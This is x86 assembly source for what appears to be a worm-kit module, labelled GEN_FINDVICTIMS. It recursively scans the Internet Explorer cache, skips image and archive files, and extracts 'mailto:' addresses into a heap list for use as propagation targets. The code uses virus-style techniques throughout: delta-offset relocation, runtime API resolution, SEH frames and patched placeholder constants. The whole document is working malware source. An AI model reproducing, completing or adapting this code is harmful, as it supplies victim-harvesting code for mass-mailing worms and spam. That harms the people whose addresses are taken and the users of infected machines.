;Descr:	This gen retrieves email addresses from IE cache folder in
;	a default process heap
;
;Type:	GEN_FINDVICTIMS
;
;INPUT:
;(EBX)	NONE
;
;OUTPUT:
;(EAX)	DWORD	address of the list of email addresses (in the heap)
;		NULL if error
;

get_email_addresses_from_ie	Proc
	pushad
	@SEH_SetupFrame	<jmp	ie_seh>
	call	ie_delta
ie_delta:
	pop	ebp				;get delta offset

	xor	eax,eax				;initialize variables
	and	[ebp + ie_alloc - ie_delta],eax
	and	[ebp + ie_mem_offset - ie_delta],eax
	and	[ebp + ie_memory - ie_delta],eax

	@pushsz	'SHELL32'
	call	esi				;get address of shell32.dll
	test	eax,eax
	je	ie_seh
	@pushsz	'SHGetSpecialFolderPathA'
	push	eax
	call	edi				;get address of api
	test	eax,eax
	je	ie_seh

	push	0
	push	20h
	call	ie_internetfolder
	db	MAX_PATH dup (?)
ie_internetfolder:
	push	0
	call	eax				;save pathname of ie-cache folder
	test	eax,eax
	je	ie_seh

	@pushsz	'KERNEL32'
	call	esi				;get address of KERNEL32.dll
	xchg	eax,ebx
	@pushsz	'FindFirstFileA'
	push	ebx
	call	edi				;get api addresses
	mov	[ebp + ie_FindFirstFileA - ie_delta],eax
	@pushsz	'FindNextFileA'
	push	ebx
	call	edi
	mov	[ebp + ie_FindNextFileA - ie_delta],eax
	@pushsz	'FindClose'
	push	ebx
	call	edi
	mov	[ebp + ie_FindClose - ie_delta],eax
	@pushsz	'SetCurrentDirectoryA'
	push	ebx
	call	edi
	mov	[ebp + ie_SetCurrentDirectoryA - ie_delta],eax
	@pushsz	'CreateFileA'
	push	ebx
	call	edi
	mov	[ebp + ie_CreateFileA - ie_delta],eax
	@pushsz	'CreateFileMappingA'
	push	ebx
	call	edi
	mov	[ebp + ie_CreateFileMappingA - ie_delta],eax
	@pushsz	'MapViewOfFile'
	push	ebx
	call	edi
	mov	[ebp + ie_MapViewOfFile - ie_delta],eax
	@pushsz	'UnmapViewOfFile'
	push	ebx
	call	edi
	mov	[ebp + ie_UnmapViewOfFile - ie_delta],eax
	@pushsz	'CloseHandle'
	push	ebx
	call	edi
	mov	[ebp + ie_CloseHandle - ie_delta],eax
	@pushsz	'GetFileSize'
	push	ebx
	call	edi
	mov	[ebp + ie_GetFileSize - ie_delta],eax
	@pushsz	'GetProcessHeap'
	push	ebx
	call	edi
	mov	[ebp + ie_GetProcessHeap - ie_delta],eax
	@pushsz	'HeapAlloc'
	push	ebx
	call	edi
	mov	[ebp + ie_HeapAlloc - ie_delta],eax
	@pushsz	'HeapReAlloc'
	push	ebx
	call	edi
	mov	[ebp + ie_HeapReAlloc - ie_delta],eax
	@pushsz	'Sleep'
	push	ebx
	call	edi
	mov	[ebp + ie_Sleep - ie_delta],eax

	mov	eax,12345678h
ie_GetProcessHeap = dword ptr $-4
	call	eax				;get default process heap
	test	eax,eax
	je	ie_seh
	mov	[ebp + ie_hHeap - ie_delta],eax	;save address

	push	1000h
	push	0
	push	eax
	mov	eax,12345678h
ie_HeapAlloc = dword ptr $-4
	call	eax				;allocate there one page (4kb)
	mov	[ebp + ie_memory - ie_delta],eax
	test	eax,eax
	je	ie_seh

	lea	eax,[ebp + ie_internetfolder-MAX_PATH - ie_delta]
	push	eax				;path of ie-cache folder
	call	ie_FileSearch			;search in files for addresses

ie_seh:	@SEH_RemoveFrame
	popad
	mov	eax,12345678h			;return ptr to array of addresses in EAX
ie_memory = dword ptr $-4
	ret


;recursive filesearch procedure

ie_FileSearch:
	pushad
	push	dword ptr [esp.cPushad+4]
	mov	eax,12345678h
ie_SetCurrentDirectoryA = dword ptr $-4
	call	eax				;go to specified directory

	call	@ie_wfd
ie_WFD	WIN32_FIND_DATA	?
@ie_wfd:pop	esi
	push	esi
	@pushsz	'*.*'
	mov	eax,12345678h
ie_FindFirstFileA = dword ptr $-4
	call	eax				;find first file there
	inc	eax
	je	ie_err_fs
	dec	eax
	xchg	eax,ebx

ie_fs_analyse:
	cmp	word ptr [esi.WFD_szFileName],'.'
	je	ie_fs_fnfa			;mustn't be '.'
	mov	eax,dword ptr [esi.WFD_szFileName]
	and	eax,0FFFFFFh
	add	eax,-'..'
	je	ie_fs_fnfa			;and '..'
	test	dword ptr [esi],FILE_ATTRIBUTE_DIRECTORY
	jne	ie_fs_open_dir			;jump if it's directory

	push	esi
	add	esi,WFD_szFileName
	mov	edx,esi				;filename in EDX
	@endsz					;go to the end of found filename
	mov	eax,[esi-4]			;get extension
	pop	esi
	or	eax,202020h			;lowercase
	cmp	eax,'ini'
	je	ie_fs_fnfa			;discard INI ...
	cmp	eax,'fig'
	je	ie_fs_fnfa			;... GIF ...
	cmp	eax,'gpj'
	je	ie_fs_fnfa			;... JPG ...
	cmp	eax,'exe'
	je	ie_fs_fnfa			;... EXE ...
	cmp	eax,'piz'
	je	ie_fs_fnfa			;... ZIP ...
	cmp	eax,'rar'
	je	ie_fs_fnfa			;... RAR ...
	cmp	eax,'fws'
	je	ie_fs_fnfa			;... and SWF files
						;the rest should be HTML files

	push	0
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	0
	push	FILE_SHARE_READ
	push	GENERIC_READ
	push	edx
	mov	eax,12345678h
ie_CreateFileA = dword ptr $-4
	call	eax				;open file
	inc	eax
	je	ie_fs_fnfa
	dec	eax
	mov	[ebp + ie_hFile - ie_delta],eax

	cdq
	push	edx
	push	edx
	push	edx
	push	PAGE_READONLY
	push	edx
	push	eax
	mov	eax,12345678h
ie_CreateFileMappingA = dword ptr $-4
	call	eax
	test	eax,eax
	je	ie_fs_closefile
	mov	[ebp + ie_hMapFile - ie_delta],eax

	cdq
	push	edx
	push	edx
	push	edx
	push	FILE_MAP_READ
	push	eax
	mov	eax,12345678h
ie_MapViewOfFile = dword ptr $-4
	call	eax				;map file
	xchg	eax,ecx
	jecxz	ie_fs_closefilemap

	pushad
	mov	esi,ecx
	push	0
	push	dword ptr [ebp + ie_hFile - ie_delta]
	mov	eax,12345678h
ie_GetFileSize = dword ptr $-4
	call	eax				;get its size
	xchg	eax,ecx
	jecxz	ie_q_fsa

	pushad
	push	300				;(miliseconds)
	mov	eax,12345678h
ie_Sleep = dword ptr $-4
	call	eax				;wait some time
	popad

	@SEH_SetupFrame	<jmp	ie_end_fsa>	;set SEH frame

ie_parse_mail:
	pushad
	call	ie_@mt
	db	'mailto:'			;find "mailto:" string
ie_@mt:	pop	edi
	push	7
	pop	ecx
	rep	cmpsb
	popad
	je	ie_scan_mail
	inc	esi
	loop	ie_parse_mail

ie_end_fsa:
	@SEH_RemoveFrame			;remove SEH frame
ie_q_fsa:
	popad

ie_fs_unmapfile:
	push	ecx
	mov	eax,12345678h
ie_UnmapViewOfFile = dword ptr $-4
	call	eax				;unmap file
ie_fs_closefilemap:
	push	12345678h
ie_hMapFile = dword ptr $-4
	call	[ebp + ie_CloseHandle - ie_delta]
ie_fs_closefile:
	push	12345678h
ie_hFile = dword ptr $-4
	mov	eax,12345678h
ie_CloseHandle = dword ptr $-4
	call	eax				;close file

ie_fs_fnfa:
	push	esi
	push	ebx
	mov	eax,12345678h
ie_FindNextFileA = dword ptr $-4
	call	eax				;try to find next file
	dec	eax
	je	ie_fs_analyse			;continue, if found

	push	ebx
	mov	eax,12345678h
ie_FindClose = dword ptr $-4
	call	eax				;close search handle
	@pushsz	'..'				;and go to up-dir
	call	[ebp + ie_SetCurrentDirectoryA - ie_delta]
ie_err_fs:	
	popad
	ret	4				;and quit from procedure
ie_fs_open_dir:
	lea	eax,[esi.WFD_szFileName]
	push	eax
	call	ie_FileSearch			;open directory and search there
	jmp	ie_fs_fnfa			;(recursively)

ie_scan_mail:
	add	esi,7
	pushad
	xor	ecx,ecx
	xor	edx,edx
	call	@ie_em_addr
ie_em_addr:
	db	50h dup (?)			;store email address here
@ie_em_addr:
	pop	edi
	push	edi
ie_n_char:
	lodsb					;parse it
	cmp	al,' '
	je	ie_s_char
	cmp	al,'"'
	je	ie_e_char
	cmp	al,''''
	je	ie_e_char
	cmp	al,'>'
	je	ie_e_char
	cmp	al,'@'
	jne	ie_o_at
	inc	edx
ie_o_at:inc	ecx
	stosb
	jmp	ie_n_char
ie_s_char:
	inc	esi
	jmp	ie_n_char
ie_e_char:
	xor	al,al
	stosb
	inc	ecx
	pop	edi
	test	edx,edx
	je	ie_end_scan_mail			;quit if no "@" in email address


	;dynamicaly allocate memory for addresses and create array of them in there

	add	[ebp + ie_mem_offset - ie_delta],ecx
	mov	ebx,ecx
	mov	eax,12345678h
ie_mem_offset = dword ptr $-4
	cmp	eax,1000h
	jb	ie_alloc_continue		;no need to allocate next page

	mov	eax,2000h
	add	eax,12345678h
ie_alloc = dword ptr $-4
	push	eax
	push	dword ptr [ebp + ie_memory - ie_delta]
	push	0
	push	12345678h
ie_hHeap = dword ptr $-4
	mov	eax,12345678h
ie_HeapReAlloc = dword ptr $-4
	call	eax				;add new 4kb page
	test	eax,eax
	je	ie_end_scan_mail
	mov	[ebp + ie_memory - ie_delta],eax
	mov	ecx,1000h
	add	[ebp + ie_alloc - ie_delta],ecx
	sub	[ebp + ie_mem_offset - ie_delta],ecx
						;correct variables
ie_alloc_continue:
	lea	esi,[ebp + ie_em_addr - ie_delta]
	mov	edi,[ebp + ie_memory - ie_delta]
	add	edi,[ebp + ie_alloc - ie_delta]
	add	edi,[ebp + ie_mem_offset - ie_delta]
	sub	edi,ebx
	@copysz					;copy email address to an array
ie_end_scan_mail:
	popad
	jmp	ie_scan_mail			;find next address
end_get_email_addresses_from_ie:
get_email_addresses_from_ie	EndP